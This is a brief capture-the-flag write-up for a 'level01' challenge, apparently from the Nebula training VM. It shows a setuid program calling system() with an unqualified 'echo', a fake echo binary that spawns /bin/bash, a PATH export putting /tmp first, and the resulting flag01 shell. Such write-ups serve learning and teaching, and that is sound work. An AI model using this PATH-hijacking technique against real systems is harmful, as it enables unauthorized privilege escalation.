## level01

The code has a vulnerability in the line (env variables "injection")</br>
```
system("(...) echo and now what?")
```

if we create a auxiliar program named echo that spawns a shell and place it into the PATH variable (before everything else that's there), we call the fake echo program, and spawn a shell under the euid of the program (flag01 user).

### auxiliar program
```
#include <stdio.h>
#include <stdlib.h>

void main(){
    system("/bin/bash");
}
```

compile it
```
gcc echo.c -o echo
```

export to PATH
```
export PATH="/tmp/:$PATH"
```

Now excute 
```
/home/flag01/flag01
getflag
```

### flag 
```
You have successfully executed getflag on a target account
```
